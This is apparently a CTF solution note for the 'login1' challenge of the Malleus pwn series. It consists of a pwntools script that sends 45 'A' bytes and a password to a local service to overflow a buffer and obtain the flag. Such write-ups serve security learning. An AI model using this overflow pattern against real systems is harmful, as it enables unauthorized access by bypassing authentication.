# Malleus CTF Pwn Challenge

- https://github.com/kusano/ctfpwn_challenge
- https://sanya.sweetduet.info/ctfpwn/

## login1

```python
#!/usr/bin/env python3
from pwn import ELF, context, log, process, remote
exe = context.binary = ELF('./login1')
# io = process([exe.path])
io = remote('localhost', 10001)
io.sendline(b'A' * 0x2d)
io.sendline(b'password')
io.recvuntil(b'The flag is: ')
log.success(io.recvline())
io.close()
```
